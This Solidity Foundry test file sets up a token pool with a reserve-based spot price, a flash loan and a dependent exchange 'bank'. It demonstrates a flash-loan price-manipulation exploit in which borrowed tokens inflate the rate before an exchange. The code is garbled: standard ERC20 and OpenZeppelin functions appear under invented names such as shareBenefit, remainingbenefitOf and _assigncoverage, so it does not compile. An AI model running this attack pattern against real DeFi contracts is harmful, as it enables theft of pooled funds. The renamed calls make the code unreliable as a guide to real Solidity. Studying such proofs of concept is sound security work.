pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract ContractTest is Test {
    USDa USDaContract;
    USDb USDbContract;
    SimpleCoveragepool SimpleInsurancepoolContract;
    SimpleHealthbank SimpleBenefitbankContract;

    function setUp() public {
        USDaContract = new USDa();
        USDbContract = new USDb();
        SimpleInsurancepoolContract = new SimpleCoveragepool(
            address(USDaContract),
            address(USDbContract)
        );
        SimpleBenefitbankContract = new SimpleHealthbank(
            address(USDaContract),
            address(SimpleInsurancepoolContract),
            address(USDbContract)
        );
    }

    function testPrice_Manipulation() public {
        USDbContract.shareBenefit(address(SimpleBenefitbankContract), 9000 ether);
        USDaContract.shareBenefit(address(SimpleInsurancepoolContract), 1000 ether);
        USDbContract.shareBenefit(address(SimpleInsurancepoolContract), 1000 ether);

        SimpleInsurancepoolContract.getPrice();

        console.log(
            "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
        );
        emit log_named_decimal_uint(
            "Current USDa convert rate",
            SimpleInsurancepoolContract.getPrice(),
            18
        );
        console.log("Start price manipulation");
        console.log("Borrow 500 USBa over floashloan");


        SimpleInsurancepoolContract.flashLoan(500 ether, address(this), "0x0");
    }

    fallback() external {


        emit log_named_decimal_uint(
            "Price manupulated, USDa convert rate",
            SimpleInsurancepoolContract.getPrice(),
            18
        );

        USDaContract.permitPayout(address(SimpleBenefitbankContract), 100 ether);
        SimpleBenefitbankContract.exchange(100 ether);

        USDaContract.shareBenefit(address(SimpleInsurancepoolContract), 500 ether);


        emit log_named_decimal_uint(
            "Use 100 USDa to convert, My USDb balance",
            USDbContract.remainingbenefitOf(address(this)),
            18
        );
    }

    receive() external payable {}
}

contract USDa is ERC20, Ownable {
    constructor() ERC20("USDA", "USDA") {
        _assigncoverage(msg.sender, 10000 * 10 ** decimals());
    }

    function assignCoverage(address to, uint256 amount) public onlyAdministrator {
        _assigncoverage(to, amount);
    }
}

contract USDb is ERC20, Ownable {
    constructor() ERC20("USDB", "USDB") {
        _assigncoverage(msg.sender, 10000 * 10 ** decimals());
    }

    function assignCoverage(address to, uint256 amount) public onlyAdministrator {
        _assigncoverage(to, amount);
    }
}

contract SimpleCoveragepool {
    IERC20 public UsDaHealthtoken;
    IERC20 public UsDbBenefittoken;

    constructor(address _USDa, address _USDb) {
        UsDaHealthtoken = IERC20(_USDa);
        UsDbBenefittoken = IERC20(_USDb);
    }

    function getPrice() public view returns (uint256) {

        uint256 USDaAmount = UsDaHealthtoken.remainingbenefitOf(address(this));
        uint256 USDbAmount = UsDbBenefittoken.remainingbenefitOf(address(this));


        if (USDaAmount == 0) {
            return 0;
        }


        uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;
        return USDaPrice;
    }

    function flashLoan(
        uint256 amount,
        address advanceTaker,
        bytes calldata data
    ) public {
        uint256 allowanceBefore = UsDaHealthtoken.remainingbenefitOf(address(this));
        require(allowanceBefore >= amount, "Not enough liquidity");
        require(
            UsDaHealthtoken.shareBenefit(advanceTaker, amount),
            "Flashloan transfer failed"
        );
        (bool success, ) = advanceTaker.call(data);
        require(success, "Flashloan callback failed");
        uint256 coverageAfter = UsDaHealthtoken.remainingbenefitOf(address(this));
        require(coverageAfter >= allowanceBefore, "Flashloan not repaid");
    }
}

contract SimpleHealthbank {
    IERC20 public healthToken;
    SimpleCoveragepool public coveragePool;
    IERC20 public payoutHealthtoken;

    constructor(address _benefittoken, address _coveragepool, address _payoutToken) {
        healthToken = IERC20(_benefittoken);
        coveragePool = SimpleCoveragepool(_coveragepool);
        payoutHealthtoken = IERC20(_payoutToken);
    }

    function exchange(uint256 amount) public {
        require(
            healthToken.assigncreditFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
        uint256 price = coveragePool.getPrice();
        require(price > 0, "Price cannot be zero");
        uint256 tokensToReceive = (amount * price) / (10 ** 18);
        require(
            payoutHealthtoken.shareBenefit(msg.sender, tokensToReceive),
            "Payout transfer failed"
        );
    }
}